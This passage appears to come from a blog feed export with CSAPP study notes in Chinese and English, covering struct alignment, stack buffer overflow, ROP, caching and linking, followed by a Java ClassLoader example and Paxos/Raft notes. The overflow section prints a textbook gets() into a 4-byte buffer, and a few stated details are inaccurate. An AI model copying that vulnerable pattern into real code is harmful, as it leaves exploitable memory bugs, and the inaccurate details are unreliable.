<p>Linux: 2字节数据类型的地址必须为2的倍数，较大的数据类型（int,double,float）的地址必须是4的倍数</p>
</blockquote>
<p>So we could design struct like this(big bit number on the front):</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/good.png"
                      class="" title="good"
                >


<h2 id="Cache-overflow"><a href="#Cache-overflow" class="headerlink" title="Cache overflow"></a>Cache overflow</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/Morgnize.jpg"
                      class="" title="Morgnize"
                >

<blockquote>
<p>最上面是运行时栈，有 8MB 的大小限制，一般用来保存局部变量。然后是堆，动态的内存分配会在这里处理，例如 malloc(), calloc(), new() 等。然后是数据，指的是静态分配的数据，比如说全局变量，静态变量，常量字符串。最后是共享库等可执行的机器指令，这一部分是只读的。</p>
</blockquote>
<blockquote>
<p>可以见到，栈在最上面，也就是说，栈再往上就是另一个程序的内存范围了，这种时候我们就可以通过这种方式修改内存的其他部分了。</p>
</blockquote>
<p>Sample:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void echo() &#123;</span><br><span class="line">	char buf[4]; // 太小</span><br><span class="line">	gets(buf);</span><br><span class="line">	puts(buf);</span><br><span class="line">&#125;</span><br><span class="line">void call_echo() &#123;</span><br><span class="line">	echo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004006cf &lt;echo&gt;:</span><br><span class="line">    4006cf: 48 83 ec 18         sub   $0x18, %rsp</span><br><span class="line">    4006d3: 48 89 e7            mov   %rsp, %rdi</span><br><span class="line">    4006d6: e8 a5 ff ff ff      callq 400680 &lt;gets&gt;</span><br><span class="line">    4006db: 48 89 e7            mov   %rsp, %rdi</span><br><span class="line">    4006de: e8 3d fe ff ff      callq 400520 &lt;puts@plt&gt;</span><br><span class="line">    4006e3: 48 83 c4 18         add   $0x18, %rsp</span><br><span class="line">    4006e7: c3                  retq</span><br><span class="line"># call_echo 部分</span><br><span class="line">    4006e8: 48 83 ec 08         sub   $0x8, %rsp</span><br><span class="line">    4006ec: b8 00 00 00 00      mov   $0x0, %eax</span><br><span class="line">    4006f1: e8 d9 ff ff ff      callq 4006cf &lt;echo&gt;</span><br><span class="line">    4006f6: 48 83 c4 08         add   $0x8, %rsp</span><br><span class="line">    4006fa: c3                  retq</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>0x18 not 4, before 4006d6</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/4006d6.jpg"
                      class="" title="4006d6"
                >

<p>See, the call_echo frame saved 4006f6 order, and when we type <code>01234567890123456789012</code></p>
<p>Cache like this(No Segment Fault):</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/cache.jpg"
                      class="" title="cache"
                >

<p>but more will override the 4006f6 get 400034(the back next order)</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/attack.jpg"
                      class="" title="attack"
                >

<p>返回导向编程: 可以利用修改已有的代码，来绕过系统和编译器的保护机制，攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。</p>
<h2 id="Optimize"><a href="#Optimize" class="headerlink" title="Optimize"></a>Optimize</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 把 nxn 的矩阵 a 的每一行加起来，存到向量 b 中</span><br><span class="line">void sum_rows1(double *a, double *b, long n)</span><br><span class="line">&#123;</span><br><span class="line">    long i, j;</span><br><span class="line">    for (i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i] = 0;</span><br><span class="line">        for (j = 0; j &lt; n; j++)</span><br><span class="line">            b[i] += a[i*n + j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 把 nxn 的矩阵 a 的每一行加起来，存到向量 b 中</span><br><span class="line">void sum_rows2(double *a, double *b, long n)</span><br><span class="line">&#123;</span><br><span class="line">    long i, j;</span><br><span class="line">    for (i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        double val = 0;</span><br><span class="line">        for (j = 0; j &lt; n; j++)</span><br><span class="line">            val += a[i*n + j];</span><br><span class="line">        b[i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>To remove quote memory</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 把 nxn 的矩阵 a 的每一行加起来，存到向量 b 中</span><br><span class="line">void sum_rows2(double *a, double *b, long n)</span><br><span class="line">&#123;</span><br><span class="line">    long i, j;</span><br><span class="line">    for (i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        double val = 0;</span><br><span class="line">        for (j = 0; j &lt; n; j++)</span><br><span class="line">            val += a[i*n + j];</span><br><span class="line">        b[i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># sum_rows2 内循环</span><br><span class="line">.L10:</span><br><span class="line">    addsd   (%rdi), %xmm0   # 浮点数载入 + 加法</span><br><span class="line">    addq    $9, %rdi</span><br><span class="line">    cmpq    %rax, %rdi</span><br><span class="line">    jne     .L10</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<p>这个问题，如果不是对处理器执行指令的机制有一定了解的话，可能会难以理解。</p>
<p>现代处理器普遍采用超标量设计，也就是基于流水线来进行指令的处理，也就是说，当执行当前指令时，接下来要执行的几条指令已经进入流水线的处理流程了。</p>
<p>这个很重要，对于顺序执行来说，不会有任何问题，但是对于条件分支来说，在跳转指令时可能会改变程序的走向，也就是说，之前载入的指令可能是无效的。这个时候就只能清空流水线，然后重新进行载入。为了减少清空流水线所带来的性能损失，处理器内部会采用称为『分支预测』的技术。</p>
<p>比方说在一个循环中，根据预测，可能除了最后一次跳出循环的时候会判断错误之外，其他都是没有问题的。这就可以接受，但是如果处理器不停判断错误的话（比方说代码逻辑写得很奇怪），性能就会得到极大的拖累。</p>
<p>分支问题有些时候会成为最主要的影响性能的因素，但有的时候其实很难避免。</p>
<hr>
<h2 id="Base-concept"><a href="#Base-concept" class="headerlink" title="Base concept"></a>Base concept</h2><p>容量 Capacity &#x3D; 每个扇区的字节数(bytes&#x2F;sector) x 磁道上的平均扇区数(avg sectors&#x2F;track) x 磁盘一面的磁道数(tracks&#x2F;surface) x 磁盘的面数(surfaces&#x2F;platter) x 硬盘包含的磁盘数(platters&#x2F;disk)</p>
<p>总的访问时间 Taccess &#x3D; 寻址时间 Tavg seek + 旋转时间 Tavg rotation + 传输时间 Tavg transfer</p>
<p>主要决定访问时间的是寻址时间和旋转延迟；读取一个扇区的第一个比特是非常耗时的，之后的都几乎可以忽略不计；硬盘比 SRAM 慢 40,000 倍，比 DRAM 慢 2500 倍。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/disk.jpg"
                      class="" title="disk"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/hostline.jpg"
                      class="" title="hostline"
                >

<p>假设 CPU 需要从硬盘中读取一些数据，会给定<code>指令</code>，<code>逻辑块编号</code>和<code>目标地址</code>，并发送给磁盘控制器。然后磁盘控制器会读取对应的数据，并通过 DMA(direct memory access)把数据传输到内存中；传输完成后，磁盘控制器通过中断的方式通知 CPU，然后 CPU 完成之后的工作</p>
<h3 id="Memory-Hierarchy"><a href="#Memory-Hierarchy" class="headerlink" title="Memory Hierarchy"></a>Memory Hierarchy</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/Hierarch.jpg"
                      class="" title="Hierarch"
                >

<blockquote>
<p>每一层都可以看作是下一层的缓存。利用局部性原理，程序会更倾向于访问第 k 层的数据，而非第 k+1 层，这样就减少了访问时间。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">缓存类型</th>
<th align="center">缓存内容</th>
<th align="right">缓存位置</th>
<th align="right">延迟(时钟周期)</th>
<th align="right">管理者</th>
</tr>
</thead>
<tbody><tr>
<td align="left">寄存器</td>
<td align="center">4-8 字节的字</td>
<td align="right">CPU 内核</td>
<td align="right">0</td>
<td align="right">编译器</td>
</tr>
<tr>
<td align="left">TLB</td>
<td align="center">地址翻译</td>
<td align="right">芯片 TLB</td>
<td align="right">0</td>
<td align="right">内存管理单元</td>
</tr>
<tr>
<td align="left">L1 缓存</td>
<td align="center">64 字节的块</td>
<td align="right">芯片 L1 缓存</td>
<td align="right">4</td>
<td align="right">硬件</td>
</tr>
<tr>
<td align="left">L2 缓存</td>
<td align="center">64 字节的块</td>
<td align="right">芯片 L2 缓存</td>
<td align="right">10</td>
<td align="right">硬件</td>
</tr>
<tr>
<td align="left">虚拟内存</td>
<td align="center">4 KB 的页</td>
<td align="right">主存</td>
<td align="right">100</td>
<td align="right">硬件 + 操作系统</td>
</tr>
<tr>
<td align="left">缓冲区缓存</td>
<td align="center">文件的部分内容</td>
<td align="right">主存</td>
<td align="right">100</td>
<td align="right">操作系统</td>
</tr>
<tr>
<td align="left">磁盘缓存</td>
<td align="center">磁盘扇区</td>
<td align="right">磁盘控制器</td>
<td align="right">100,000</td>
<td align="right">磁盘固件</td>
</tr>
<tr>
<td align="left">网络缓冲区缓存</td>
<td align="center">文件的部分内容</td>
<td align="right">本地磁盘</td>
<td align="right">10,000,000</td>
<td align="right">NFS 客户端</td>
</tr>
<tr>
<td align="left">浏览器缓存</td>
<td align="center">网页</td>
<td align="right">本地磁盘</td>
<td align="right">10,000,000</td>
<td align="right">网络浏览器</td>
</tr>
<tr>
<td align="left">Web 缓存</td>
<td align="center">网页</td>
<td align="right">远程服务器磁盘</td>
<td align="right">1,000,000,000	Web</td>
<td align="right">代理服务器</td>
</tr>
</tbody></table>
<p>Cache miss</p>
<ul>
<li>强制性失效(Cold&#x2F;compulsory Miss): CPU 第一次访问相应缓存块，缓存中肯定没有对应数据，这是不可避免的</li>
<li>冲突失效(Confilict Miss): 在直接相联或组相联的缓存中，不同的缓存块由于索引相同相互替换，引起的失效叫做冲突失效<ul>
<li>假设这里有 32KB 直接相联的缓存</li>
<li>如果有两个 8KB 的数据需要来回访问，但是这两个数组都映射到相同的地址，缓存大小足够存储全部的数据，但是因为相同地址发生了冲突需要来回替换，发生的失效则全都是冲突失效（第一次访问失效依旧是强制性失效），这时缓存并没有存满</li>
</ul>
</li>
<li>容量失效(Capacity Miss): 有限的缓存容量导致缓存放不下而被替换，被替换出去的缓存块再被访问，引起的失效叫做容量失效<ul>
<li>假设这里有 32KB 直接相联的缓存</li>
<li>如果有一个 64KB 的数组需要重复访问，数组的大小远远大于缓存大小，没办法全部放入缓存。第一次访问数组发生的失效全都是强制性失效。之后再访问数组，再发生的失效则全都是容量失效，这时缓存已经存满，容量不足以存储全部数据</li>
</ul>
</li>
</ul>
<h2 id="Cache-Memory"><a href="#Cache-Memory" class="headerlink" title="Cache Memory"></a>Cache Memory</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/cpu.jpg"
                      class="" title="Cpu"
                >

<ul>
<li>S 表示集合(set)数量</li>
<li>E 表示数据行(line)的数量</li>
<li>B 表示每个缓存块(block)保存的字节数目</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/cachecalc.jpg"
                      class="" title="cachecalc"
                >

<p>C &#x3D; E * S * B</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/index.jpg"
                      class="" title="index"
                >

<h3 id="Read"><a href="#Read" class="headerlink" title="Read:"></a>Read:</h3><p>set index: set; tag: compare to every line; block offset: line offset</p>
<p>If E &#x3D; 1: Direct Mapped Cache</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/direct.jpg"
                      class="" title="DIRECT"
                >

<p>| 寻址空间是 M&#x3D;16 字节，也就是 4 位的地址，对应 B&#x3D;2, S&#x3D;4, E&#x3D;1</p>
<blockquote>
<p>先从 set index 确定那个 set，然后看 valid 位，接着利用 t bits 分别和每个 line 的 tag 进行比较，如果匹配则命中，那么返回 4 5 位置的数据，如果不匹配，就需要替换，可以随机替换，也可以用 least recently used(LRU) 来进行替换</p>
</blockquote>
<hr>
<h2 id="Complie"><a href="#Complie" class="headerlink" title="Complie"></a>Complie</h2><p>预处理器：将 C 语言代码(da.c)转化成 da.i 文件(gcc –E)，对应于预处理命令 cpp<br>编译器：C 语言代码(da.c, wang.c)经过编译器的处理(gcc -0g -S)成为汇编代码(da.s, wang.s)<br>汇编器：汇编代码(da.s, wang.s)经过汇编器的处理(gcc 或 as)成为对象程序(da.o, wang.o)<br>链接器：对象程序(da.o, wang.o)以及所需静态库(lib.a)经过链接器的处理(gcc 或 ld)最终成为计算机可执行的程序<br>加载器：将可执行程序加载到内存并进行执行，loader 和 ld-linux.so</p>
<p>head file search rule:</p>
<ol>
<li>所有头文件的搜寻会从 -I 开始</li>
<li>然后找环境变量 C_INCLUDE_PATH, CPLUS_INCLUDE_PATH, OBJC_INCLUDE_PATH 指定的路径</li>
<li>再找默认目录(&#x2F;usr&#x2F;include, &#x2F;usr&#x2F;local&#x2F;include, &#x2F;usr&#x2F;lib&#x2F;gcc-lib&#x2F;i386-linux&#x2F;2.95.2&#x2F;include 等等)</li>
</ol>
<h3 id="Object-files"><a href="#Object-files" class="headerlink" title="Object files"></a>Object files</h3><p>所谓的对象文件(Object File)实际上是一个统称，具体来说有以下三种形式：</p>
<ul>
<li>可重定位目标文件 Relocatable object file (.o file)<ul>
<li>每个 .o 文件都是由对应的 .c 文件通过编译器和汇编器生成，包含代码和数据，可以与其他可重定位目标文件合并创建一个可执行或共享的目标文件</li>
</ul>
</li>
<li>可执行目标文件 Executable object file (a.out file)<ul>
<li>由链接器生成，可以直接通过加载器加载到内存中充当进程执行的文件，包含代码和数据</li>
</ul>
</li>
<li>共享目标文件 Shared object file (.so file)<ul>
<li>在 windows 中被称为 Dynamic Link Libraries(DLLs)，是类特殊的可重定位目标文件，可以在链接(静态共享库)时加入目标文件或加载时或运行时(动态共享库)被动态的加载到内存并执行</li>
</ul>
</li>
</ul>
<h3 id="Object-format"><a href="#Object-format" class="headerlink" title="Object format"></a>Object format</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/10/01/csapp/oformat.jpg"
                      class="" title="objectformat"
                >

<p>ELF header</p>
<ul>
<li>包含 word size, byte ordering, file type (.o, exec, .so), machine type, etc</li>
</ul>
<p>Segment header table</p>
<ul>
<li>包含 page size, virtual addresses memory segments(sections), segment sizes</li>
</ul>
<p>.text section</p>
<ul>
<li>代码部分</li>
</ul>
<p>.rodata section</p>
<ul>
<li>只读数据部分，例如跳转表</li>
</ul>
<p>.data section</p>
<ul>
<li>初始化的全局变量</li>
</ul>
<p>.bss section</p>
<ul>
<li>未初始化的全局变量</li>
</ul>
<p>.symtab section</p>
<ul>
<li>包含 symbol table, procudure 和 static variable names 以及 section names 和 location</li>
</ul>
<p>.rel.txt section</p>
<ul>
<li>.text section 的重定位信息</li>
</ul>
<p>.rel.data section</p>
<ul>
<li>.data section 的重定位信息</li>
</ul>
<p>.debug section</p>
<ul>
<li>包含 symbolic debugging (gcc -g) 的信息</li>
</ul>
<p>Section header table</p>
<ul>
<li>每个 section 的大小和偏移量</li>
</ul>
<p>链接器实际上会处理三种不同的符号，对应于代码中不同写法的部分：</p>
<ul>
<li>全局符号 Global symbols<ul>
<li>在当前模块中定义，且可以被其他代码引用的符号，例如非静态 C 函数和非静态全局变量</li>
</ul>
</li>
<li>外部符号 External symbols<ul>
<li>同样是全局符号，但是是在其他模块（也就是其他的源代码）中定义的，但是可以在当前模块中引用</li>
</ul>
</li>
<li>本地符号 Local symbols<ul>
<li>在当前模块中定义，只能被当前模块引用的符号，例如静态函数和静态全局变量</li>
<li>注意，Local linker symbol 并不是 local program variables</li>
</ul>
</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 文件 main.c</span><br><span class="line">int sum(int *a, int n);</span><br><span class="line">int array[2] = &#123;1, 2&#125;; // 变量 array 在此定义</span><br><span class="line">int main() // 定义了一个全局函数</span><br><span class="line">&#123;</span><br><span class="line">    int val = sum(array, 2);</span><br><span class="line">    // val 是局部变量，链接器并不知道</span><br><span class="line">    // sum 函数是一个全局引用</span><br><span class="line">    // array 变量是一个全局引用</span><br><span class="line">    return val;</span><br><span class="line">&#125;</span><br><span class="line">// -----------------------------------------</span><br><span class="line">// 文件 sum.c</span><br><span class="line">int sum(int *a, int n) // 定义了一个全局函数</span><br><span class="line">&#123;</span><br><span class="line">    int i, s = 0;</span><br><span class="line">    // i 和 s 是局部变量，链接器并不知道</span><br><span class="line">    for (i = 0; i &lt; n; i++)</span><br><span class="line">        s += a[i];</span><br><span class="line">    </span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>链接器只知道非静态的全局变量&#x2F;函数，不了解局部变量</p>
<ul>
<li>局部非静态变量会保存在栈中</li>
<li>局部静态变量会保存在 .bss 或 .data 中</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Program</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>（转）Custom ClassLoader</title>
    <url>/2018/02/11/custom-classloader/</url>
    <content><![CDATA[<pre><code>package com.loader;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

/*
/Bootstrap Classloader -&gt; rt.jar 
Extension Classloader extends Classloader -&gt; %JAVA_HOME%/lib/ext/*.jar
App Classloader extends Classloader -&gt; ClassPath
*/


public class MyLoader extends ClassLoader &#123;
    private String path;
    private String name;

    public MyLoader(String name, String path) &#123;
        // make the sys loader as parent loader
        super();
        this.path = path;
        this.name = name;
    &#125;

    public MyLoader(ClassLoader parent, String name, String path) &#123;
        // point parent loader
        super(parent);
        this.path = path;
        this.name = name;
    &#125;

    // custom define class
    @Override
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;
        byte[] data = readClassFileToByteArray(name);
        return this.defineClass(name, data, 0, data.length);
    &#125;

    //get .class file byte array
    private byte[] readClassFileToByteArray(String name) &#123;
        InputStream is = null;
        byte[] returnData = null;
        name = name.replaceAll(&quot;\\.&quot;,&quot;/&quot;);
        String filePath = this.path + name + &quot;.class&quot;;
        File file = new File(filePath);

        ByteArrayOutputStream os = new ByteArrayOutputStream();
        try &#123;
            is = new FileInputStream(file);
            int tmp = 0;
            while((tmp = is.read()) != -1)&#123;
                os.write(tmp);
            &#125;
            returnData = os.toByteArray();
        &#125; catch (Exception e)&#123;
            e.printStackTrace();
        &#125; finally &#123;
            try &#123;
                is.close();
                os.close();
            &#125; catch (Exception e2)&#123;
                e2.printStackTrace();
            &#125;
        &#125;
        return returnData;
    &#125;



    @Override
    public String toString() &#123;
        return this.name;
    &#125;

    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException &#123;
        MyLoader loader = new MyLoader(&quot;There&quot;, &quot;D:/tmp/&quot;);
        //null: bootstrap classloader
        //not found, loadClass will try to go method findClass which was overwritten by child
        MyLoader childLoader = new MyLoader(null, &quot;child&quot;, &quot;D:/tmp/&quot;);
        Class&lt;?&gt; c = childLoader.loadClass(&quot;Demo&quot;);
        c.newInstance();
    &#125;
    /*
    protected Class&lt;?&gt; loadClass(String name, boolean resolve)
            throws ClassNotFoundException
    &#123;
        synchronized (getClassLoadingLock(name)) &#123;
            // First, check if the class has already been loaded
            Class&lt;?&gt; c = findLoadedClass(name);
            if (c == null) &#123;
                long t0 = System.nanoTime();
                try &#123;
                    if (parent != null) &#123;
                        c = parent.loadClass(name, false);
                    &#125; else &#123;
                        c = findBootstrapClassOrNull(name);
                    &#125;
                &#125; catch (ClassNotFoundException e) &#123;
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                &#125;

                if (c == null) &#123;
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    PerfCounter.getFindClasses().increment();
                &#125;
            &#125;
            if (resolve) &#123;
                resolveClass(c);
            &#125;
            return c;
        &#125;
    &#125;
    */
&#125;
</code></pre>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>classLoader</tag>
        <tag>findClass</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>distributed algorithm</title>
    <url>/2021/11/13/distributed-algo/</url>
    <content><![CDATA[<h1 id="极客时间-分布式算法-整理"><a href="#极客时间-分布式算法-整理" class="headerlink" title="极客时间 分布式算法 整理"></a>极客时间 分布式算法 整理</h1><h2 id="Paxos"><a href="#Paxos" class="headerlink" title="Paxos"></a>Paxos</h2><h3 id="basic-paxos"><a href="#basic-paxos" class="headerlink" title="basic paxos"></a>basic paxos</h3><p>proposer： 发起请求的人，提议一个值，用于投票表决</p>
<p>acceptor：对每个提议的值进行投票</p>
<p>learner：被告知投票结果，接受达成共识的值。一般来说，学习者是数据备份节点，比如【Master-Slave】模型中的 Slave，被动地接受数据，容灾备份。</p>
<h4 id="stage"><a href="#stage" class="headerlink" title="stage"></a>stage</h4><h5 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h5><p>客户端发送准备请求，节点接受提案号，并作出响应【尚无提案】，承诺不接受比当前节点获得提案号小的提案号。如果接收到了小于当前节点提案号的提案，那么节点将不接受并且不做响应。</p>
<h5 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h5><p>客户端收到大多数节点的准备响应后发送接收请求，这时会提交提案号和提案值，如果客户端接收的准备响应为【尚无提案】，那么会将自己的提案值提交给节点。节点接收时，按准备阶段接收的小提案号的提案请求会被拒绝，大于等于的会被接受达成共识。</p>
<blockquote>
<p>如果集群中有学习者，当接受者通过提案就会通知所有学习者。学习者发现大多数接收者通过了某个提案就会学习（接受）该提案的值。</p>
</blockquote>
<p>Acceptor 保证三个承诺，具体来说：如果准备请求的提案编号，小于等于接受者已经响应的准备请求的提案编号，那么接受者将承诺不响应这个准备请求；<br>如果接受请求中的提案的提案编号，小于接受者已经响应的准备请求的提案编号，那么接受者将承诺不通过这个提案；<br>如果接受者之前有通过提案，那么接受者将承诺，会在准备请求的响应中，包含已经通过的最大编号的提案信息。</p>
<blockquote>
<p>basic paxos 能容忍一半以内的节点过账</p>
</blockquote>
<h3 id="multi-paxos"><a href="#multi-paxos" class="headerlink" title="multi-paxos"></a>multi-paxos</h3><h4 id="review"><a href="#review" class="headerlink" title="review"></a>review</h4><p>basic paxos 只能就单个值达成共识，一旦遇到为一系列值实现共识时就不管用了。</p>
<p>Multi-Paxos 是一种思想，不是算法。而Multi-Paxos 算法是一个统称，它是指基于 Multi-Paxos 思想，通过多个 Basic Paxos实例实现一系列值的共识的算法（比如 Chubby Multi-Paxos 实现、Raft 算法等）。</p>
<h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><p>如果多个提议者同时提交提案，可能出现因为提案冲突，在准备阶段没有提议者接收到大多数准备响应，协商失败，需要重新协商。你想象一下，一个 5 节点的集群，如果 3个节点作为提议者同时提案，就可能发生因为没有提议者接收大多数响应（比如 1 个提议者接收到 1 个准备响应，另外 2 个提议者分别接收到 2 个准备响应）而准备失败，需要重新协商。</p>
<p>2轮的 rpc 消耗较大，延迟高，不建议</p>
<h5 id="leader"><a href="#leader" class="headerlink" title="leader"></a>leader</h5><p>引入领导者，让领导者作为唯一的提议者，这样不存在多个提议者提议自然也就没有冲突了。</p>
<p>客户端【A，B，C】 &lt;-&gt; 【single leader】 &lt;-&gt; 节点【I, II】</p>
<h5 id="optimize"><a href="#optimize" class="headerlink" title="optimize"></a>optimize</h5><p>当领导者处于稳定状态时，省掉准备阶段，直接进入接受阶段。</p>
<h5 id="Chubby-的-Multi-Paxos-实现"><a href="#Chubby-的-Multi-Paxos-实现" class="headerlink" title="Chubby 的 Multi-Paxos 实现"></a>Chubby 的 Multi-Paxos 实现</h5><ol>
<li><p>引入了 leader</p>
</li>
<li><p>leader 是通过执行 basic paxos 投票选举产生的，并且运行过程中主节点通过续租来延长 租期(Lease)。实际场景中可能几天内都是同一个节点作为leader，leader故障后其他节点会选举新的leader，即leader一直存在且唯一。</p>
</li>
<li><p>实现了优化：稳定态省掉准备阶段</p>
<ol>
<li>稳定态：领导者节点上，序列中的命令是最新的，不再需要通过准备请求来发现之前被大多数节点通过的 提案，领导者可以独立指定提案中的值。</li>
<li>准备阶段的意义，是发现接受者节点上，已经通过的提案的值。如果在所有接受者节点上，都没有已经通过的提案了，这时，领导者就可以自己指定提案的值了，那么，准备阶 段就没有意义了，也就是可以省掉了。</li>
</ol>
</li>
<li><p>实现了成员变更，保证节点变更时集群平稳运行。</p>
</li>
<li><p>为了实现强一致性，读操作也只能在主节点上执行。</p>
</li>
</ol>
<h2 id="Raft"><a href="#Raft" class="headerlink" title="Raft"></a>Raft</h2><blockquote>
<p>从本质上说，Raft 算法是通过 [一切以领导者为准] 的方式，实现 [一系列值] 的共识和各节点日志的一致</p>
</blockquote>
<h3 id="role-which-also-called-server-state"><a href="#role-which-also-called-server-state" class="headerlink" title="role which also called server state"></a>role which also called server state</h3><ul>
<li>Follower: accept and process message from leader, and election itself as candidate when the heartbeat to leader timeout.</li>
<li>Candidate: send request vote(rpc message) to other nodes. It will be promoted to leader if only it won majority votes.</li>
<li>Leader：1. process write request 2. manage log copy 3. restrict them from initiating new elections by sending heartbeats</li>
</ul>
<blockquote>
<p>tips: Raft use strong leader model, only one leader can be existed.</p>
</blockquote>
<blockquote>
<p>跟随者：就相当于普通群众，默默地接收和处理来自领导者的消息，当等待领导者心跳 信息超时的时候，就主动站出来，推荐自己当候选人<br>候选人：候选人将向其他节点发送请求投票（RequestVote）RPC 消息，通知其他节点来投票，如果赢得了大多数选票，就晋升当领导者<br>领导者：蛮不讲理的霸道总裁，一切以我为准，平常的主要工作内容就是 3 部分，处理写请求、管理日志复制和不断地发送心跳信息，通知其他节点“我是领导者，我还活着，你们现在不要发起新的选举，找个新领导者来替代我。”</p>
</blockquote>
<h3 id="leader-election-process"><a href="#leader-election-process" class="headerlink" title="leader election process"></a>leader election process</h3><ol>
<li>all nodes begin as follower state with zero term. 在初始状态下，集群中所有的节点都是跟随者的状态。</li>
<li>raft has implemented random timeout feature. Raft 算法实现了随机超时时间的特性。</li>
<li>the node A has minimum timout will be the first one does not get the leader’s heart beat. 它会最先因为没有等到领导者的心跳信息，发生超时。</li>
<li>At this time, node A will increase its term and elect itself as candidate. It votes itself first and then send voteRequest to other node with asking them elect A as Leader.这个时候，节点 A 就增加自己的任期编号，并推举自己为候选人，先给自己投上一张选票，然后向其他节点发送请求投票 RPC 消息，请它们选举自己为领导者。</li>
<li>When other noe accept A request but does not vote at term 1, it will vote A and increase its term.如果其他节点接收到候选人 A 的请求投票 RPC 消息，在编号为 1 的这届任期内，也还没有进行过投票，那么它将把选票投给节点 A，并增加自己的任期编号</li>
<li>If candidate win majority votes in the ‘elect timeout’. it will be the leader at that term.如果候选人在选举超时时间内赢得了大多数的选票，那么它就会成为本届任期内新的领导者。</li>
<li>When node A as the leader, it will periodically send heart beat to inform other nodes it’s the leader and prevent followers initiating election. 节点 A 当选领导者后，他将周期性地发送心跳消息，通知其他服务器我是领导者，阻止跟随者发起新的选举。</li>
</ol>
<h5 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h5><ol>
<li>Q: How do nodes communicate ?<ol>
<li>RequestVote Rpc, send from candidate at election time, to inform other node send vote.</li>
<li>AppendEntries Rpc, send from leader to copy log and provide heart beat message.</li>
</ol>
</li>
<li>Q: What is the term ?<ol>
<li>Follower will increase its term when elect itself as candidate at waiting leader’s heart beat timeout.  跟随者在等待领导者心跳信息超时后，推举自己为候选人时，会增加自己的任期号.</li>
<li>When node get term field at vote request from other nodes, it will update its term to <code>max(its term, vote&#39;s term)</code></li>
<li>candidate or leader will be follower immediately when it receives greater term from other request.</li>
<li>node will reject the request if its term is smaller than node has.</li>
</ol>
</li>
<li>Q: rules in election?<ol>
<li>leader send heart beat to all followers.</li>
<li>follower elect itself when leader’s heartbeat timeout.</li>
<li>candidate will be leader if win the majority votes.</li>
<li>leader will be still leader except problem(leader dead or network delay) happened.</li>
<li>At each term every node will send no more than one vote with first come first got rule.<ol>
<li>在一次选举中，每一个服务器节点最多会对一个任期编号投出一张选票，并且按照“先来先服务”的原则进行投票。比如节点 C 的任期编号为 3，先收到了 1 个包含任期编号为 4 的投票请求（来自节点 A），然后又收到了 1 个包含任期编号为 4 的投票请求（来 自节点 B）。那么节点 C 将会把唯一一张选票投给节点 A，当再收到节点 B 的投票请求RPC 消息时，对于编号为 4 的任期，已没有选票可投了。</li>
</ol>
</li>
<li>When got the same term, follower with high log integrity will reject send vote to lower log integrity.<ol>
<li>当任期编号相同时，日志完整性高的跟随者（也就是最后一条日志项对应的任期编号值更大，索引号更大），拒绝投票给日志完整性低的候选人。</li>
